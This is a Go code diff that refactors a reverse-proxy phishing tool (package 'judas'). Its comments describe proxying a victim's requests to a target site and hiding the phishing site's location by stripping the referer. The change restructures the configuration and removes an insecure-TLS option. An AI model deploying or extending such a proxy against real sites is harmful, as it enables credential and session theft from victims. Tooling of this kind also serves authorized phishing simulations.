@@ -2,26 +2,25 @@ package judas
 
 import (
 	"context"
-	"crypto/tls"
 	"log"
 	"net/http"
 	"net/http/httputil"
+	"net/url"
 	"strings"
 )
 
 // phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
 // It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
 type phishingProxy struct {
-	*Config
+	TargetURL            *url.URL
+	ResponseTransformers []ResponseTransformer
+	Logger               *log.Logger
 }
 
 // Director updates a request to be sent to the target website
 func (p *phishingProxy) Director(request *http.Request) {
 	request.URL.Scheme = p.TargetURL.Scheme
 	request.URL.Host = p.TargetURL.Host
-
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: p.SourceInsecure}
-
 	request.Host = p.TargetURL.Host
 
 	// Don't let a stray referer header give away the location of our site.
@@ -107,11 +106,16 @@ func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
 
 // New returns a HTTP handler configured for phishing.
 func New(config *Config) *ProxyServer {
-	phishingProxy := &phishingProxy{Config: config}
+	phishingProxy := &phishingProxy{
+		TargetURL:            config.TargetURL,
+		ResponseTransformers: config.ResponseTransformers,
+		Logger:               config.Logger,
+	}
+
 	reverseProxy := &httputil.ReverseProxy{
 		Director:       phishingProxy.Director,
 		ModifyResponse: phishingProxy.ModifyResponse,
-		Transport:      phishingProxy.Transport,
+		Transport:      config.Transport,
 	}
 
 	return &ProxyServer{
